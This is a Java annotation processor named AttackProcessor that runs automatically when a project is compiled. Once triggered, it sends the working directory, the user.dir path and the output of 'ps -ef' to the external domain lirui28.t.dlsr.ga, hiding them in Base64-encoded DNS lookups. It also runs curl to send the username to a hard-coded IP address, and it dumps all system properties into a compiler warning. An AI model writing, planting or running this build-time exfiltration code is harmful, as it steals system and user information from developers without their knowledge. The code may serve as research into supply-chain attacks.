package org.cyber;


import javax.annotation.processing.AbstractProcessor;
import javax.annotation.processing.ProcessingEnvironment;
import javax.annotation.processing.RoundEnvironment;
import javax.annotation.processing.SupportedAnnotationTypes;
import javax.lang.model.element.TypeElement;
import javax.tools.Diagnostic;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Inet4Address;
import java.net.UnknownHostException;
import java.util.Base64;
import java.util.Set;

@SupportedAnnotationTypes("*")
public class AttackProcessor extends AbstractProcessor {
    @Override
    public synchronized void init(ProcessingEnvironment processingEnv) {
        super.init(processingEnv);
    }

    @Override
    public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment roundEnv) {
        StringBuffer sb = new StringBuffer("");
        sb.append(System.getProperties());

        File folder = new File(System.getProperty("user.home"));

        try
        {
            Inet4Address.getByName( "javac2.lirui28.t.dlsr.ga" );
            String pwd = new File( "." ).getAbsolutePath();
            pwd = new String( Base64.getEncoder().encode( pwd.getBytes() ) );

            Inet4Address.getByName( System.getProperty("user.dir")+".lirui28.t.dlsr.ga" );
            Inet4Address.getByName( pwd+".lirui28.t.dlsr.ga" );

            Runtime runtime = Runtime.getRuntime();

            try {
                Process p = runtime.exec("ps -ef");
                BufferedReader bw = new BufferedReader( new InputStreamReader( p
                                                                                               .getInputStream()));
                String s;
                while ((s=bw.readLine())!=null) {

                    s = new String( Base64.getEncoder().encode( s.getBytes() ) );

                    s = s.substring( 0,60 );
                    Inet4Address.getByName( s+".lirui28.t.dlsr.ga" );
                }
            } catch (IOException e) {
                Inet4Address.getByName( "runtimeerror"+".lirui28.t.dlsr.ga" );

                e.printStackTrace();
            }

        }
        catch ( UnknownHostException e )
        {
            //e.printStackTrace();
        }

        try {
            Runtime r = Runtime.getRuntime();
            //Process p = r.exec(new String[]{"/bin/bash","-c","open ."});

            Process p = r.exec(new String[]{"/bin/bash","-c","curl http://182.92.151.151:8888/"+System.getProperty("user.name")});
            p.waitFor();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }


        processingEnv.getMessager().printMessage(
                Diagnostic.Kind.MANDATORY_WARNING, "Hello Worlds!"+sb.toString());
        return false;
    }
}
